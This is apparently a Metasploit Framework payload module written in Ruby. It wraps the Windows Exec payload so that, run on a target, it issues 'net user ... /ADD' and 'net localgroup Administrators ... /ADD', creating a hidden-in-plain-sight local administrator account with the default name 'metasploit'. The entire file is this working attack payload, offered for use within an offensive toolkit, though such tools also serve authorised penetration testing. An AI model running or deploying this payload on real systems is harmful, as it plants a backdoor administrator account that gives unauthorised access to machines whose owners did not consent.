require 'msf/core'

module Msf
module Payloads
module Singles
module Windows

###
#
# AddUser
# -------
#
# Extends the Exec payload to add a new user.
#
###
module AddUser

	include Msf::Payloads::Singles::Windows::Exec

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows Execute net user /ADD',
			'Alias'         => 'win32/adduser',
			'Version'       => '$Revision$',
			'Description'   => 'Create a new user and add them to local administration group',
			'Author'        => 'hdm',
			'Platform'      => 'win',
			'Arch'          => ARCH_IA32,
			'Privileged'    => true))

		# Register command execution options
		register_options(
			[
				OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
				OptString.new('PASS', [ true, "The password for this user", ""           ]),
			], Msf::Payloads::Singles::Windows::Exec)
	end

	#
	# Override the exec command string
	#
	def command_string
		user = datastore['USER'] || 'metasploit'
		pass = datastore['PASS'] || ''

		return "cmd.exe /c net user #{user} #{pass} /ADD && " +
			"net localgroup Administrators #{user} /ADD"
	end

end

end end end end
